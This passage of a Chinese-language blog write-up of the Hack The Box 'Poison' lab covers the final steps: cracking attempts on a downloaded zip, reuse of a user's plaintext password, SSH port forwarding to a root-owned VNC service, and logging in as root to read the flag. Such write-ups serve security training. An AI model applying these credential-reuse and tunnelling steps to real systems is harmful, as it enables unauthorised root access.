+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ wget http://10.10.10.84:8080/secret.zip <br>--2024-01-06 11:13:01--  http://10.10.10.84:8080/secret.zip<br>正在连接 10.10.10.84:8080... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：166 [application/zip]<br>正在保存至: “secret.zip”<br><br>secret.zip             100%[=========================&gt;]     166  --.-KB/s  用时 0s      <br><br>2024-01-06 11:13:01 (8.52 MB/s) - 已保存 “secret.zip” [166/166])<br></code></pre></td></tr></table></figure>
+
+<p>9、本地解压文件进行查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ unzip secret.zip         <br>Archive:  secret.zip<br>[secret.zip] secret password: <br>   skipping: secret                  incorrect password<br></code></pre></td></tr></table></figure>
+
+<p>10、发现需要密码，进行密码破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ zip2john secret.zip &gt; hashzip <br>ver 2.0 secret.zip/secret PKZIP Encr: cmplen=20, decmplen=8, crc=77537827 ts=9827 cs=7753 <span class="hljs-built_in">type</span>=0<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ john hashzip                                        <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (PKZIP [32/64])<br>Will run 3 OpenMP threads<br>Proceeding with single, rules:Single<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>Almost <span class="hljs-keyword">done</span>: Processing the remaining buffered candidate passwords, <span class="hljs-keyword">if</span> any.<br>Proceeding with wordlist:/usr/share/john/password.lst<br>Proceeding with incremental:ASCII<br>0g 0:00:04:21  3/3 0g/s 31310Kp/s 31310Kc/s 31310KC/s p0022/0p..p0p0281d<br>Session aborted<br></code></pre></td></tr></table></figure>
+
+<p>11、但是并没有破解成功，这里复用当前用户的密码，成功解压出来</p>
+<p><code>Charix!2#4%6&amp;8(0</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ unzip secret.zip         <br>Archive:  secret.zip<br>[secret.zip] secret password: <br> extracting: secret<br></code></pre></td></tr></table></figure>
+
+<p>12、查看该文件类型，发现这个疑似是一个密码的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ file secret                       <br>secret: Non-ISO extended-ASCII text, with no line terminators<br></code></pre></td></tr></table></figure>
+
+<p>13、继续回到初始权限下，查看下进程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">charix@Poison:~ % netstat -an -p tcp<br>Active Internet connections (including servers)<br>Proto Recv-Q Send-Q Local Address          Foreign Address        (state)<br>tcp4       0     44 10.10.10.84.22         10.10.14.5.56966       ESTABLISHED<br>tcp4       0      0 127.0.0.1.25           *.*                    LISTEN<br>tcp4       0      0 *.80                   *.*                    LISTEN<br>tcp6       0      0 *.80                   *.*                    LISTEN<br>tcp4       0      0 *.22                   *.*                    LISTEN<br>tcp6       0      0 *.22                   *.*                    LISTEN<br>tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN<br>tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN<br>charix@Poison:~ % ps -auwwx | grep vnc<br>root    529   0.0  0.9  23620  8868 v0- I    03:31     0:00.04 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1<br>charix 1054   0.0  0.0    412   328  1  R+   05:39     0:00.00 grep vnc<br>charix@Poison:~ % <br></code></pre></td></tr></table></figure>
+
+<p>14、发现了VNC的进程，下面使用 ssh 进行端口转发到本地</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ ssh -L 9999:127.0.0.1:5901 charix@10.10.10.84  <br>(charix@10.10.10.84) Password <span class="hljs-keyword">for</span> charix@Poison:<br>Last login: Sat Jan  6 04:05:32 2024 from 10.10.14.5<br>FreeBSD 11.1-RELEASE (GENERIC) <span class="hljs-comment">#0 r321309: Fri Jul 21 02:08:28 UTC 2017</span><br><br>Welcome to FreeBSD!<br><br>Release Notes, Errata: https://www.FreeBSD.org/releases/<br>Security Advisories:   https://www.FreeBSD.org/security/<br>FreeBSD Handbook:      https://www.FreeBSD.org/handbook/<br>FreeBSD FAQ:           https://www.FreeBSD.org/faq/<br>Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/<br>FreeBSD Forums:        https://forums.FreeBSD.org/<br><br>Documents installed with the system are <span class="hljs-keyword">in</span> the /usr/local/share/doc/freebsd/<br>directory, or can be installed later with:  pkg install en-freebsd-doc<br>For other languages, replace <span class="hljs-string">&quot;en&quot;</span> with a language code like de or fr.<br><br>Show the version of FreeBSD installed:  freebsd-version ; <span class="hljs-built_in">uname</span> -a<br>Please include that output and any error messages when posting questions.<br>Introduction to manual pages:  man man<br>FreeBSD directory layout:      man hier<br><br>Edit /etc/motd to change this login announcement.<br>FreeBSD is started up by the program <span class="hljs-string">&#x27;init&#x27;</span>.  The first thing init does when<br>starting multiuser mode (ie, starting the computer up <span class="hljs-keyword">for</span> normal use) is to<br>run the shell script /etc/rc.  By reading /etc/rc and the /etc/rc.d/ scripts,<br>you can learn a lot about how the system is put together, <span class="hljs-built_in">which</span> again will<br>make you more confident about what happens when you <span class="hljs-keyword">do</span> something with it.<br>charix@Poison:~ % <br></code></pre></td></tr></table></figure>
+
+<p>15、本地使用使用 vncviewer 工具 和压缩包获取的 secret 进行登录该程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ vncviewer 127.0.0.1:9999 -passwd secret<br>Connected to RFB server, using protocol version 3.8<br>Enabling TightVNC protocol extensions<br>Performing standard VNC authentication<br>Authentication successful<br>Desktop name <span class="hljs-string">&quot;root&#x27;s X desktop (Poison:1)&quot;</span><br>VNC server default format:<br>  32 bits per pixel.<br>  Least significant byte first <span class="hljs-keyword">in</span> each pixel.<br>  True colour: max red 255 green 255 blue 255, <span class="hljs-built_in">shift</span> red 16 green 8 blue 0<br>Using default colormap <span class="hljs-built_in">which</span> is TrueColor.  Pixel format:<br>  32 bits per pixel.<br>  Least significant byte first <span class="hljs-keyword">in</span> each pixel.<br>  True colour: max red 255 green 255 blue 255, <span class="hljs-built_in">shift</span> red 16 green 8 blue 0<br>Same machine: preferring raw encoding<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Poison-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>16、成功获取到root的flag信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Poison:~ <span class="hljs-comment"># id</span><br>uid=0(root) gid=0(wheel) <span class="hljs-built_in">groups</span>=0(wheel),5(operator)<br>root@Poison:~ <span class="hljs-comment"># id</span><br>uid=0(root) gid=0(wheel) <span class="hljs-built_in">groups</span>=0(wheel),5(operator)<br>root@Poison:~ <span class="hljs-comment"># cat /root/root.txt</span><br>716d04b188419cf2bb99d891272361f5<br>root@Poison:~ <span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/132</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Poison-htb-writeup</div>
+      <div>https://sh1yan.top/2024/01/06/Poison-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/07/TartarSauce-htb-writeup/" title="TartarSauce-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">TartarSauce-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/05/Node-htb-writeup/" title="Node-htb-writeup">
+                        <span class="hidden-mobile">Node-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
